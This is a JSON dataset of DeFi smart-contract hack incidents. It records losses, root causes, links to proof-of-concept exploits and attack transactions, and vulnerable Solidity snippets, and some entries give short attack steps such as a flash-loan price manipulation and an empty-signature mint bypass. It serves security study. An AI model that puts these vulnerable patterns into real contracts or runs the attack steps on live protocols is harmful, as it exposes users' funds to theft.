        "vulnerable_code_snippet": "function deposit() public {\n    uint _want = IERC20(want).balanceOf(address(this));\n    if (_want > 0) {\n        IERC20(want).safeApprove(y, 0);\n        IERC20(want).safeApprove(y, _want);\n        yERC20(y).deposit(_want);\n    }\n    uint _y = IERC20(y).balanceOf(address(this));\n    if (_y > 0) {\n        IERC20(y).safeApprove(curve, 0);\n        IERC20(y).safeApprove(curve, _y);\n        ICurveFi(curve).add_liquidity(_y, 0, 0, 0);\n    }\n    uint _ycrv = IERC20(ycrv).balanceOf(address(this));\n    if (_ycrv > 0) {\n        IERC20(ycrv).safeApprove(yycrv, 0);\n        IERC20(ycrv).safeApprove(yycrv, _ycrv);\n        yERC20(yycrv).deposit(_ycrv);\n    }\n}"
    },
    {
        "type": "Insufficient validation",
        "date": "20221020",
        "lost": "12BNB",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20221020-bego---incorrect-signature-verification",
        "title": "BEGO",
        "root_cause": "Insufficient validation",
        "vulnerable_code_snippet": "modifier isSigned(\n        string memory _txHash,\n        uint256 _amount,\n        bytes32[] memory _r,\n        bytes32[] memory _s,\n        uint8[] memory _v\n    ) {\n        require(checkSignParams(_r, _s, _v), \"bad-sign-params\");\n        bytes32 _hash = keccak256(abi.encodePacked(bsc, msg.sender, _txHash, _amount));\n        address[] memory _signers = new address[](_r.length); //vulnerable point\n        for (uint8 i = 0; i < _r.length; i++) {\n            _signers[i] = ecrecover(_hash, _v[i], _r[i], _s[i]);\n        }\n\n        require(isSigners(_signers), \"bad-signers\");\n        _;\n    }\n\n    function isSigners(address[] memory _signers) public view returns (bool){\n        for (uint8 i = 0; i < _signers.length; i++) {  //vulnerable point\n            if (!_containsSigner(_signers[i])) {\n                return false;\n            }\n        }\n        return true;  // null data will return true \n    }\n\n    function mint(\n        uint256 _amount,\n        string memory _txHash,\n        address _receiver,\n        bytes32[] memory _r,\n        bytes32[] memory _s,\n        uint8[] memory _v\n    ) isSigned(_txHash, _amount, _r, _s, _v) external returns (bool){ //trace isSigned\n        require(!txHashes[_txHash], \"tx-hash-used\");\n        txHashes[_txHash] = true;\n\n        _mint(_receiver, _amount);\n        return true;\n    }",
        "attack_tx": "Attacker can input empty data into _r, _s and _v to bypass all checks to mint BEGO token.",
        "analysis": null
    },
    {
        "type": "Flashloans, Price Manipulation",
        "date": "20221026",
        "lost": "$200k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/ULME.sol",
        "title": "ULME",
        "root_cause": "The `buyMiner` function in the contract UniverseGoldMountain (ULME) is public and could potentially enable price manipulation. Utilize a Flashloan to borrow BUSD from the lending platform. Execute a swap of the borrowed BUSD for ULME tokens via PancakeSwap. Utilize pre-approved users who possess BUSD tokens to trigger the **`buyMiner`** function of the ULME token. Employ indirect price manipulation to exchange ULME tokens back for BUSD. And this behavior will increase the ULME token again. Repay the Flashloan and secure a profit of 50,646 BUSD as the profit.",
        "attack_tx": "https://bscscan.com/tx/0xdb9a13bc970b97824e082782e838bdff0b76b30d268f1d66aac507f1d43ff4ed",
        "analysis": [
            "Utilize a Flashloan to borrow BUSD from the lending platform.",
            "Execute a swap of the borrowed BUSD for ULME tokens via PancakeSwap.",
            "Utilize pre-approved users who possess BUSD tokens to trigger the `buyMiner` function of the ULME token.",
            "Employ indirect price manipulation to exchange ULME tokens back for BUSD. And this behavior will increase the ULME token again.",
            "Repay the Flashloan and secure a profit of 50,646 BUSD as the profit."
        ],
        "references": [
            "https://twitter.com/BlockSecTeam/status/1584839309781135361",
            "https://twitter.com/BeosinAlert/status/1584888021299916801"
        ],
        "vulnerable_code_snippet":"function buyMiner(address user,uint256 usdt)public returns (bool){\n        address;\n        token[0] = _usdt_token;\n        token[1] = address(this);\n        usdt = usdt.add(usdt.div(10));\n        require(IERC20(_usdt_token).transferFrom(user,address(this),usdt), \"buyUlm: transferFrom to ulm error\");\n        uint256 time = sale_date;\n        sale_date = 0;\n        address k = 0x25812c28CBC971F7079879a62AaCBC93936784A2;\n        IUniswapV2Router01(_roter).swapExactTokensForTokens(usdt, 1000000, token, k, block.timestamp + 60);\n        IUniswapV2Router01(k).transfer(address(this), address(this), IERC20(address(this)).balanceOf(k));\n        sale_date = time;\n        return true;\n    }"
    },
    {
        "type": "Incorrect logic",
        "date": "20230905",
        "title": "FloorDAO",
        "root_cause": "The problem originated from the `stake()` function in the FloorDAO contract. This function sends funds to the caller before triggering a rebase. As a result, instead of distributing an amount of sFLOOR equal to the newly minted FLOOR in the next rebase, it includes the user's stake. This causes a mismatch between the contract's FLOOR balance and the circulating sFLOOR. The attacker exploited this by repeatedly calling the `stake()` and `unstake()` functions within the same transaction",
        "attack_tx": "https://explorer.phalcon.xyz/tx/eth/0x1274b32d4dfacd2703ad032e8bd669a83f012dde9d27ed92e4e7da0387adafe4",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-09/FloorDAO_exp.sol",
        "analysis": [
            "https://twitter.com/PeckShieldAlert/status/169896210505836132",
            "https://medium.com/floordao/floor-post-mortem-incident-summary-september-5-2023-e054a2d5afa4"
        ],
        "lost": "$40ETH",
        "vulnerable_code_snippet":"function stake(\n        address _to,\n        uint256 _amount,\n        bool _rebasing,\n        bool _claim\n    ) external returns (uint256) {\n        FLOOR.safeTransferFrom(msg.sender, address(this), _amount);\n        _amount = _amount.add(rebase()); // add bounty if rebase occurred\n        if (_claim && warmupPeriod == 0) {\n            return _send(_to, _amount, _rebasing);\n        } else {\n            Claim memory info = warmupInfo[_to];\n            if (!info.lock) {\n                require(_to == msg.sender, \"External deposits for account are locked\");\n            }\n\n            warmupInfo[_to] = Claim({\n                deposit: info.deposit.add(_amount),\n                gons: info.gons.add(sFLOOR.gonsForBalance(_amount)),\n                expiry: epoch.number.add(warmupPeriod),\n                lock: info.lock\n            });\n\n            gonsInWarmup = gonsInWarmup.add(sFLOOR.gonsForBalance(_amount));\n\n            return _amount;\n        }\n    }"
    },
    {
        "type": "Flashloans, Insufficient validation",
        "date": "20220905",
        "title": "ZoomproFinance",
        "fixed": "unfixed?",
        "root_cause": "Insufficient validation",
        "attack_tx": null,
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220905-zoomprofinance---flashloans--price-manipulation",
        "analysis": "Attacker uss fake usdt in zoom pair to trick protocol.\n\nVulnerable code snippet: \nunverified contract\n\n[https://bscscan.com/address/0x47391071824569F29381DFEaf2f1b47A4004933B#code](https://bscscan.com/address/0x47391071824569F29381DFEaf2f1b47A4004933B#code)",
        "lost": "$61,160 USDT"
    },
    {
        "type": "Reentrancy",
        "date": "20240125",
        "title": "NBLGAME",
        "root_cause": "Lack of reentry protection on the withdrawNft() function.",
        "attack_tx": "https://phalcon.blocksec.com/explorer/tx/optimism/0xf4fc3b638f1a377cf22b729199a9aeb27fc62fe2983a65c4d14b99ee5c5b2328",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/NBLGAME_exp.sol",
        "analysis": "https://twitter.com/AnciliaInc/status/1750558426382635036",
        "lost": "180K",
        "vulnerable_code_snippet":"function withdrawNft(uint256 _index) public {\n        StakeInfo[] storage stakes = userStakeInfo[msg.sender];\n        require(_index < stakes.length, \"invalid stake index\");\n\n        uint tokenid = stakes[_index].nftTokenId;\n        require(tokenid > 0, \"no stake available\");\n\n        uint amount = stakes[_index].nblStakeAmount;\n        uint power = getSlotPower(msg.sender, _index);\n\n        nft.safeTransferFrom(address(this), msg.sender, tokenid);\n        if (stakes[_index].inscriptionId > 0) {\n            inscription.safeTransferFrom(address(this), msg.sender, stakes[_index].inscriptionId);\n        }\n\n        uint discount = calcDiscount(stakes[_index].begin, amount);\n        nbl.safeTransfer(community, discount);\n        nbl.safeTransfer(msg.sender, SafeMath.sub(amount, discount));\n\n        uint multiply = slotPowerMultiplies[stakes.length - 1];\n        power = SafeMath.mul(power, multiply) / 100;\n        stakebook.withdraw(msg.sender, power);\n\n        stakes[_index].nftTokenId = 0;\n        stakes[_index].inscriptionId = 0;\n        stakes[_index].nblStakeAmount = 0;\n        stakes[_index].begin = 0;\n\n        emit WithdrawNft(msg.sender, tokenid);\n    }"
    },
    {
        "type": "Storage collision",
        "date": "20231225",
        "title": "Telcoin",
        "root_cause": "The vulnerability stems from improper initialization of wallet contracts, which is due to a mismatch between the wallet's actual implementation and its corresponding proxy. Specifically, during the initialization process, the proxy initialized storage slot 0 to a non-zero state by writing to the least significant bits of the storage location. Subsequently, the wallet code also wrote to storage slot 0, thereby overwriting the proxy's initial value in the least significant bits. This issue is not the result of an inherent vulnerability in either of the smart contracts but rather the interaction between the two.\n\nConsequently, after the initialization process, the least significant two bytes of slot 0 will be reset to zero. This effectively sets both _initialized and _initializing to zero. As a result, the CloneableProxy:Proxy contract becomes vulnerable to re-initialization through the initialize() function, as the initializer modifier's protection can be circumvented.",
        "attack_tx": [
            "https://www.oklink.com/es-la/polygon/tx/0x35f50851c3b754b4565dc3e69af8f9bdb6555edecc84cf0badf8c1e8141d902d",
            "https://phalcon.blocksec.com/explorer/tx/polygon/0x35f50851c3b754b4565dc3e69af8f9bdb6555edecc84cf0badf8c1e8141d902d"
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/Telcoin_exp.sol",
        "analysis": "https://blocksecteam.medium.com/telcoin-security-incident-in-depth-analysis-d1945e22818f"
    },
    {
        "type": "Reentrancy",
        "date": "20231216",
        "title": "NFTTrader",
        "root_cause": "The \"editCounterPart\" function which allows changing swap counterparties can be called externally and lacked reentrancy protection. Exploiting via editCounterPart: -- After initiating closeSwapIntent, the attacker makes a reentrant call to the **'editCounterPart'** function of the BatchSwap contract.\n-- Unlike closeSwapIntent, **editCounterPart** lacks reentrancy protection.\n-- The attacker changes the counterparty of the swap to another address they control (0x01de...). This is a critical state change and manipulates the intended flow of the swap.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/NFTTrader_exp.sol",
        "attack_tx": "https://www.oklink.com/es-la/eth/tx/0xec7523660f8b66d9e4a5931d97ad8b30acc679c973b20038ba4c15d4336b393d",
        "attacker": "0xb1EdF2a0BA8Bc789cBc3DFbe519737cAdA034D2D",
        "analysis": [
            "https://x.com/SlowMist_Team/status/1736005523550646535",
            "https://x.com/0xArhat/status/1736038250190651467"
        ],
        "vulnerable_code": "https://www.oklink.com/es-la/eth/address/0xc310e760778ecbca4c65b6c559874757a4c4ece0/contract",
        "vulnerable_code_snippet":"function editCounterPart(uint256 _swapId, address payable _counterPart) public {\n        require(msg.sender == swapList[msg.sender][swapMatch[_swapId]].addressOne, \"Message sender must be the swap creator\");\n        swapList[msg.sender][swapMatch[_swapId]].addressTwo = _counterPart;\n    }"
    },
    {
        "type": "Access Control",
        "date": "20230524",
        "title": "Local Trade LCT",
        "root_cause": "Improper Access Control of Close-source contract, involved modifying certain contract parameters and exploiting vulnerabilities in the getTokenPrice() function.",
        "attack_tx": [
            "https://bscscan.com/tx/0x57b589f631f8ff20e2a89a649c4ec2e35be72eaecf155fdfde981c0fec2be5ba",
            "https://bscscan.com/tx/0xbea605b238c85aabe5edc636219155d8c4879d6b05c48091cf1f7286bd4702ba",
            "https://bscscan.com/tx/0x49a3038622bf6dc3672b1b7366382a2c513d713e06cb7c91ebb8e256ee300dfb",
            "https://bscscan.com/tx/0x042b8dc879fa193acc79f55a02c08f276eaf1c4f7c66a33811fce2a4507cea63"
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/LocalTrader2_exp.sol",
        "analysis": "https://twitter.com/numencyber/status/1661213691893944320",
        "vulnerable_code_snippet": "// Data structures and variables inferred from the use of storage instructions\nuint256 stor_3; // STORAGE[0@x3]\n\nuint256 stor_@_@_19; // STORAGE[@x0@] bytes @ to 19\n\nuint256 owner_1_@_19; // STORAGE[@x1] bytes @ to 19\n\nuint256 owner_2_0_19; // STORAGE[@x2] bytes @ to 19\n\nuint256 _getTokenPrice; // STORAGE[@x2] bytes 20 to 20\n\nfunction 0x925d400c(uint256 varg®) public payable {\nrequire(4 + (msg.data. length - 4) - 4 >= 32);\n@xcac(varg@);\nrequire(msg.sender == owner_1_0_19, Error('You are not admin'));\nstor_3 = vargQ;\nreturn vargQ;\n\nfunction @xb5863c10(address varg@) public payable {\nrequire(4 + (msg.data. length - 4) - 4 >= 32);\nrequire(varg® == vargQ);\nstor_@_0_19 = vargQ;\nowner_1_0_19 = msg.sender;\nowner_2_0_19 = msg.sender;\nstor_3 = 0x2a1766f5d000;\n function getTokenPrice() public payable { if (_getTokenPrice != bool(1)) { v0 = v1 = stor_3; } else { require(bool(stor_0_0_19.code.size)); v2, /* uint8 */ v3, v4, v5, v6, /* ... */ require(bool(v2), 0, RETURN_DATASIZE); require(v3 == uint80(v3)); 0xcac(v4); require(v5 == v5); require(v6 == v6); require(v7 == uint8(v7)); require(!( (v4 > 0) & (0x2540be400 > ... )); v0 = v4 * 0x2540be400; return v0; }"
    },
    {
        "type": "Incorrect logic",
        "date": "20230505",
        "lost": "$5.4M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/DEI_exp.sol",
        "title": "DEI",
        "root_cause": "Fetch allowance of msg.sender for account instead of reverse.",
        "attack_tx": "https://arbiscan.io/tx/0xb1141785b7b94eb37c39c37f0272744c6e79ca1517529fec3f4af59d4c3c37ef",
        "analysis": "https://twitter.com/eugenioclrc/status/1654576296507088906",
        "vulnerable_code_snippet":"function burnFrom(address account, uint256 amount) public virtual { uint256 currentAllowance = _allowances[_msgSender()][account];  // @audit: should be _allowances[account][_msgSender()] _approve(account, _msgSender(), currentAllowance - amount); _burn(account, amount); }"
    },
    {
        "type": "Access Control, MEV",
        "date": "20220913",
        "title": "MevBot private tx",
        "root_cause": "Incorrect access control.We can see a public function called pancakeCall, which means anyone can call this function. Once pass all required check then perform 0x10a(v0, varg2, varg1); Track into 0x10a(), we can see transfer funds to addree 'MEM[varg0.data+32]'. Since variable 'http://varg0.data' attacker can control over calldata in pancakeCall. So that's why an attacker can drain out the funds from the MEV contract.",
        "attack_tx": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220913-mevbot-private-tx",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220913-mevbot-private-tx",
        "analysis": "<p>We can see a public function called pancakeCall, which means anyone can call this function.</p>\n<ol>\n<li>Decompile contract\n[https://bscscan.com/address/0x64dd59d6c7f09dc05b472ce5cb961b6e10106e1d](https://bscscan.com/address/0x64dd59d6c7f09dc05b472ce5cb961b6e10106e1d)</li>\n<li>Check pancakeCall code logic\nOnce pass all required check then perform 0x10a(v0, varg2, varg1);</li>\n<li>Track into 0x10a(), we can see transfer funds to addree \"MEM[varg0.data+32]\" . Since variable \"[http://varg0.data](https://t.co/KT6EufOI6Z)\" attacker can control over calldata in pancakeCall. So that's why an attacker can drain out the funds from the MEV contract.</li>\n</ol>\n<p><code>function 0x10a(uint256 varg0, uint256 varg1, uint256 varg2) private {      require(varg0.data + varg0.length - varg0.data >= 96);     require(MEM[varg0.data] == address(MEM[varg0.data]));     v0 = v1 = MEM[varg0.data + 64];     if (0 == varg2) {         v2, v3 = msg.sender.token1().gas(msg.gas);         require(v2); // checks call status, propagates error data on error         require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);         require(v3 == address(v3));         goto 0x214;     } else {         v4, v3 = msg.sender.token0().gas(msg.gas);         require(v4); // checks call status, propagates error data on error         require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32);         require(v3 == address(v3));     }     if (varg2) {     }     v5, v6 = address(v3).transfer(address(MEM[varg0.data]), varg1).gas(msg.gas);  **//vulnerable point**  }</code></p>",
        "vulnerable_code_snippet": "function pancakeCall(address varg0, uint256 varg1, uint256 varg2, bytes varg3) public payable { require(msg.data.length - 4 >= 128); require(varg0 == varg0); require(varg3 == 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff); require(4 + varg3 <= msg.data.length); require(varg3.length <= 0xffffffffffffffffffff); require(4 + varg3 + varg3.length + 32 <= msg.data.length); CALLDATACOPY(v0.data, 36 + varg3, varg3.length); v0[varg3.length] = 0; 0x10a(v0, varg2, varg1); }\n\n\nfunction 0x10a(uint256 varg0, uint256 varg1, uint256 varg2) private { require(varg0.data + varg0.length - varg0.data >= 96); require(MEM[varg0.data] == address(MEM[varg0.data])); v0 = v1 = MEM[varg0.data + 64]; if (0 == varg2) { v2, v3 = msg.sender.token1().gas(msg.gas); require(v2); // checks call status, propagates error data on error require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32); require(v3 == address(v3)); goto 0x214; } else { v4, v3 = msg.sender.token0().gas(msg.gas); require(v4); // checks call status, propagates error data on error require(MEM[64] + RETURNDATASIZE() - MEM[64] >= 32); require(v3 == address(v3)); } if (varg2) { } v5, v6 = address(v3).transfer(address(MEM[varg0.data]), varg1).gas(msg.gas); //vulnerable point }"
    },
    {
        "type": "Access Control",
        "date": "20230328",
        "lost": "$8.9M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/safeMoon_exp.sol",
        "title": "SafeMoon",
        "root_cause": "The root cause of the attack was that during an upgrade of the Safe Moon contract, an access control vulnerability was introduced in the Public burn function. This vulnerability allowed an attacker to burn tokens from any address.",
        "vulnerable_code_snippet": "function burn(address from, uint256 amount) public {   // Vulnerable Point: Public Burn function Without proper Access Control\n        _tokenTransfer(from, bridgeBurnAddress, amount, 0, false);\n    }",
        "attack_tx": "https://bscscan.com/tx/0x48e52a12cb297354a2a1c54cbc897cf3772328e7e71f51c9889bb8c5e533a934",
        "analysis": [
            "https://twitter.com/peckshield/status/1640855857910149122",
            "https://www.zellic.io/blog/safemoon-exploit-explained",
            "https://medium.com/coinmonks/decoding-safemoon-protocols-8-9-million-exploit-quillaudits-a5b11417f0b9"
        ]
    },
    {
        "type": "Arbitrary call, Dex/AMM, Insufficient validation",
        "date": "20230218",
        "title": "RevertFinance",
        "lost": "$30k",
        "root_cause": "The V3Utils contract had insufficient input validation, allowing arbitrary external calls, resulting in the theft of funds from approved users. The contract relied on an external aggregator called Ox for executing swaps. The frontend called the Ox API, which returned two dynamic keys, 'to' and 'allowanceTarget,' specifying which contracts to call and approve tokens to. These dynamic values were forwarded to the V3Utils contract instead of being whitelisted. This allowed the attacker to send a token contract (e.g., USDC) as the swap router, granting them the ability to execute arbitrary code on it, such as the 'transferFrom' function, which led to the attacker stealing funds from other addresses that have approved to the V3Utils contract.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/RevertFinance_exp.sol",
        "vulnerable_code_snippet": "struct SwapParams { IERC20 tokenIn; IERC20 tokenOut; uint256 amountIn; uint256 minAmountOut; address recipient; // recipient of tokenOut and leftover tokenIn bytes swapData; bool unwrap; // if tokenIn or tokenOut is WETH - unwrap } function swap(SwapParams calldata params) external payable returns (uint256 amountOut) { _prepareAdd(params.tokenIn, IERC20(address(0)), IERC20(address(0)), params.amountIn, 0, 0); uint amountInDelta; (amountInDelta, amountOut) = _swap(params.tokenIn, params.tokenOut, params.amountIn, params.minAmountOut, params.swapData); // send swapped amount of tokenOut if (amountOut > 0) { _transferToken(params.recipient, params.tokenOut, amountOut, params.unwrap); } // if not all was swapped - return leftovers of tokenIn uint leftOver = params.amountIn - amountInDelta; if (leftOver > 0) { _transferToken(params.recipient, params.tokenIn, leftOver, params.unwrap); } }",
        "attack_tx": "https://etherscan.io/tx/0xdaccbc437cb07427394704fbcc8366589ffccf974ec6524f3483844b043f31d5",
        "analysis": [
            "https://mirror.xyz/revertfinance.eth/3sdpQ3v9vEKiOjaHXUi3TdEfhleAXXlAEWeODrRHJtU",
            "https://twitter.com/revertfinance/status/1627490043026890752"
        ]
    },
    {
        "type": "Access Control, Price Manipulation",
        "date": "20230829",
        "title": "EAC",
        "root_cause": "The attacker was able to manipulate the price of EAC on pancake swap, allowing them to trade from pair token to EAC for a profit. ",
        "attack_tx": "https://bscscan.com/tx/0x477f9ee698ac8ae800ffa012ab52fd8de39b58996245c5e39a4233c1ae5f1baa",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-08/EAC_exp.sol",
        "analysis": "https://lunaray.medium.com/eac-hack-analysis-8c66d4237f11",
        "lost": "$29BNB",
        "vulnerable_code_snippet":"function 0xe6a24c3f(uint256 varg) public payable { require(msg.data.length - 4 >= 32); v0 = new address ; CALLDATACOPY(v0.data, msg.data.length, 64); require(v0.length, Panic(50)); // access an out-of-bounds or n v1 = v0.data; v0[0] = _uSDT; require(1 < v0.length, Panic(50)); // access an out-of-bounds v0[1] = stor_3_0_19; v2, /* uint256 */ v3 = _uSDT.balanceOf(this).gas(msg.gas); require(bool(v2), 0, RETURN_DATASIZE()); // checks call status require(MEM[64] + RETURN_DATASIZE() - MEM[64] >= 32); require(v3 >= varg); v4, /* bool */ v5 = _uSDT.approve(_uniswapV2Router, varg).gas require(bool(v4), 0, RETURN_DATASIZE()); // checks call status require(MEM[64] + RETURN_DATASIZE() - MEM[64] >= 32); require(v5 == bool(v5)); v6 = new address[](v0.length); v7 = v8 = v6.data; v9 = v0.data; v11 = 0; while (v11 < v0.length) { MEM[v7] = address(MEM[v9]); v9 += 32; v11 += 1; } require(bool(_uniswapV2Router.code.size)); }"
    },
    {
        "type": "Math",
        "date": "20230416",
        "title": "Swapos V2",
        "root_cause": "Incorrect K check. There's a judgment error in the k-value, which allows the attacker to withdraw funds from the pair contract.",
        "lost": "$468k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Swapos_exp.sol",
        "attack_tx": "https://etherscan.io/address/0x2df07c054138bf29348f35a12a22550230bd1405",
        "analysis": [
            "https://twitter.com/CertiKAlert/status/1647530789947469825",
            "https://twitter.com/BeosinAlert/status/1647552192243728385"
        ],
        "vulnerable_code_snippet": "function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock { require(amount0Out > 0 || amount1Out > 0, 'UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT'); (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings require(amount0Out < _reserve0 && amount1Out < _reserve1, 'UniswapV2: INSUFFICIENT_LIQUIDITY'); uint balance0; uint balance1; { // scope for _token{0,1}, avoids stack too deep errors address _token0 = token0; address _token1 = token1; require(to != _token0 && to != _token1, 'UniswapV2: INVALID_TO'); if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data); balance0 = IERC20(_token0).balanceOf(address(this)); balance1 = IERC20(_token1).balanceOf(address(this)); } uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0; uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0; require(amount0In > 0 || amount1In > 0, 'UniswapV2: INSUFFICIENT_INPUT_AMOUNT'); { // scope for reserve{0,1}Adjusted, avoids stack too deep errors uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(3)); uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(3)); require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'UniswapV2: K');  // @audit: should be 10_000 as above } _update(balance0, balance1, _reserve0, _reserve1); emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to); }"
    },
    {
        "type": "ERC20",
        "date": "20221012",
        "lost": "$127 k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20221012-atk---flashloan-manipulate-price",
        "title": "ATK",
        "root_cause": "Insecure use balanceOf to calculate price is vulnerable to price manipulation over flash loan.The calim Function use getPrice() in ASK Token Contract\n\nIncorrect price calculation via balanceOf.",
        "analysis": "The calim Function use getPrice() in ASK Token Contract\n\nIncorrect price calculation via balanceOf.",
        "vulnerable_code_snippet":"function getPrice() public view returns(uint256){\\n        uint256 UDPrice;\\n        uint256 UDAmount  = balanceOf(_uniswapV2Pair); //vulnerable point\\n        uint256 USDTAmount = USDT.balanceOf(_uniswapV2Pair); //vulnerable point\\n        UDPrice = UDAmount.mul(10**18).div(USDTAmount);\\n        return UDPrice;\\n}"
    },
    {
        "type": "Dex/AMM, Flashloans",
        "date": "20210804",
        "lost": "390 ETH",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20210804-waultfinace---flashloan-price-manipulation",
        "title": "WaultFinace",
        "root_cause": "incorrect logic. Attacker can stake lots of USDT to WUSDMaster to raise the price of WEX.",
        "vulnerable_code": "https://bscscan.com/address/0xa79Fe386B88FBee6e492EEb76Ec48517d1eC759a#code#L698",
        "vulnerable_code_snippet":"function stake(uint256 amount) external nonReentrant { require(amount <= maxStakeAmount, 'amount too high'); usdt.safeTransferFrom(msg.sender, address(this), amount); if(feePermille > 0) { uint256 feeAmount = amount * feePermille / 1000; usdt.safeTransfer(treasury, feeAmount); amount = amount - feeAmount; } uint256 wexAmount = amount * wexPermille / 1000; usdt.approve(address(wswapRouter), wexAmount); wswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens( //vulnerable point, incorrect logic wexAmount, 0, swapPath, address(this), block.timestamp ); wusd.mint(msg.sender, amount); emit Stake(msg.sender, amount); }"
    },
    {
        "type": "Deflationary token, Miscalculation, Stablecoin",
        "date": "20210628",
        "title": "SafeDollar",
        "root_cause": "Incorrect calculation & Deflationary token uncompatible. Due to PLX is a deflationary token: Deposit PLX tokens to SdoRewardPOOL to deduct PLX token in SdoRewardPOOL contract. Until lp token balance in contract is 2. Then calculate a big reward value in updatePool function.",
        "attack_tx": null,
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20210628-safedollar---deflationary-token-uncompatible",
        "analysis": "Same ZABU finance incident\nVulnerable code snippet:\nhttps://polygonscan.com/address/0xd4a7d5ca5232976ebf9c28b7231bfdbf4c4eee95#code#L1913\nhttps://polygonscan.com/address/0x17684f4d5385fac79e75ceafc93f22d90066ed5c#code#L730\nDue to PLX is a deflationary token\n1.Deposit PLX tokens to SdoRewardPOOL to deduct PLX token in SdoRewardPOOL contract.\n2.Until lp token balance in contract is 2. Then calculate a big reward value in updatePool function.\n```solidity\nfunction transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        require(recipient != address(0), \"ERC777: transfer to the zero address\");\n\n        address from = _msgSender();\n        _callTokensToSend(from, from, recipient, amount, \"\", \"\");\n        _move(from, from, recipient, amount, \"\", \"\");\n        return true;\n    }\n```\n```solidity\n// Update reward variables of the given pool to be up-to-date.\n    function updatePool(uint256 _pid) public {\n        PoolInfo storage pool = poolInfo[_pid];\n        if (now <= pool.lastRewardTime) {\n            return;\n        }\n        uint256 lpSupply = pool.lpToken.balanceOf(address(this));\n        if (lpSupply == 0) {\n            pool.lastRewardTime = now;\n            return;\n        }\n        if (!pool.isStarted) {\n            pool.isStarted = true;\n            totalAllocPoint = totalAllocPoint.add(pool.allocPoint);\n        }\n        if (totalAllocPoint > 0) {\n            uint256 _time = now.sub(pool.lastRewardTime);\n            uint256 _sdoReward = _time.mul(rewardPerSecond).mul(pool.allocPoint).div(totalAllocPoint);\n            **pool.accSdoPerShare** = pool.accSdoPerShare.add(_sdoReward.mul(1e18).div(lpSupply)); // manipulate lpSupply to 2\n        }\n        pool.lastRewardTime = now;\n    }\n```",
        "vulnerable_code": "function transfer(address recipient, uint256 amount) public virtual override returns (bool) { require(recipient != address(0), \"ERC777: transfer to the zero address\"); address from = _msgSender(); _callTokensToSend(from, from, recipient, amount, \"\", \"\"); _move(from, from, recipient, amount, \"\", \"\"); _callTokensReceived(from, from, recipient, amount, \"\", \"\", false); return true; } function _move(address _operator, address from, address to, uint256 amount, bytes memory userData, bytes memory operatorData) internal override returns (uint256 _amountSent) { _beforeTokenTransfer(_operator, from, to, amount); uint256 _amount = amount; if (!_isExcludedFromFee[from] && !_isExcludedToFee[to]) { { uint256 _jackpotRate = jackpotRate; if (_jackpotRate > 0) { uint256 _jackpotAmount = amount.mul(_jackpotRate).div(10000); address _jackpotFund = jackpotFund; _balances[from] = _balances[from].sub(_jackpotAmount, \"MTokenERC777: transfer amount exceeds balance\"); _balances[_jackpotFund] = _balances[_jackpotFund].add(_jackpotAmount); _amount = _amount.sub(_jackpotAmount); _totalJackpotAdded = _totalJackpotAdded.add(_jackpotAmount); emit Transfer(from, _jackpotFund, _jackpotAmount); } } { uint256 _burnAmount = 0; uint256 _burnRate = burnRate; if (_burnRate > 0) { _burnAmount = amount.mul(_burnRate).div(10000); _amount = _amount.sub(_burnAmount); } uint256 _addLiquidityRate = addLiquidityRate; if (_addLiquidityRate > 0) { uint256 _addLiquidityAmount = amount.mul(_addLiquidityRate).div(10000); _burnAmount = _burnAmount.add(_addLiquidityAmount); _amount = _amount.sub(_addLiquidityAmount); addLiquidityAccumulated = addLiquidityAccumulated.add(_addLiquidityAmount); uint256 _addLiquidityAccumulated = addLiquidityAccumulated; if (_addLiquidityAccumulated >= minAmountToAddLiquidity) { _mint(liquidityFund, _addLiquidityAccumulated, \"\", \"\"); _totalLiquidityAdded = _totalLiquidityAdded.add(_addLiquidityAccumulated); ILiquidityFund(liquidityFund).addLiquidity(_addLiquidityAccumulated); emit AddLiquidity(_addLiquidityAccumulated); addLiquidityAccumulated = 0; } } if (_burnAmount > 0) { _burn(from, _burnAmount, \"\", \"\"); //vulnerable point, burn token } }\n\n\n  // Update reward variables of the given pool to be up-to-date.\n    function updatePool(uint256 _pid) public {\n        PoolInfo storage pool = 